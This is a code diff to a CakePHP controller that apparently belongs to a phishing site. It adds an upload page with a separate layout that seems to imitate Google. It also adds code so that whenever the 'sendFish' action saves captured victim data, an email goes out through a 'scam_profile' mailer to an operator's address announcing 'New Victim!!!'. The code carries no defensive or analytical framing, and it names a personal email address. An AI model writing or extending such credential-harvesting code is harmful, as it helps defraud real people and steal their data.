@@ -19,6 +19,7 @@ use Cake\Network\Exception\ForbiddenException;
 use Cake\Network\Exception\NotFoundException;
 use Cake\View\Exception\MissingTemplateException;
 use Cake\Event\Event;
+use Cake\Mailer\Email;
 /**
  * Static content controller
  *
@@ -41,6 +42,18 @@ class HomeController extends AppController
         $this->viewBuilder()->layout('default_2');
       }
 
+      public function uploadGeneric(){
+        $param = $this->request->params['param'];
+        $this->set(compact('param'));
+        $this->set('_serialize',['param']);
+        $this->viewBuilder()->layout('default');
+
+      }
+
+      public function uploadGoogle(){
+        $this->viewBuilder()->layout('default_3'); 
+      }
+
 
       public function sendFish(){
         if($this->request->is('ajax')){
@@ -52,6 +65,11 @@ class HomeController extends AppController
                $fish = $this->Fishes->newEntity($data);
                if($this->Fishes->save($fish))
                {
+                   $email = new Email('scam_profile');
+                   $email->to('riehlemm@gmail.com')
+                    ->subject('une nouvelle victime enregitrée')
+                    ->send('New Victim!!!');
+
                     $response = ['message'=>'ok'];
                     $this->set(compact('response'));
                     $this->set('_serialize',['response']);
